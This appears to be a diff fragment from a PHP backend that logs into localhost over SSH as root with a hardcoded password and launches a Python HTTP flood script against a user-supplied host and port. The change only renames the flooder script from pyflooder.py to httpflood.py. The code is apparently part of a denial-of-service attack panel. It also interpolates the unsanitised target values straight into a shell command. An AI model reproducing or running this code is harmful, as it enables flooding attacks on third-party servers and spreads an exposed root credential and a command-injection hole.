@@ -11,7 +11,7 @@
     $connection = ssh2_connect('localhost', 22);
     ssh2_auth_password($connection, 'root', 'Lolol123');
 
-    $stream = ssh2_exec($connection, "screen -dmS -X python pyflooder.py http://{$host} {$port} 1000");
+    $stream = ssh2_exec($connection, "screen -dmS -X python httpflood.py http://{$host} {$port} 1000");
 
     }else{
       
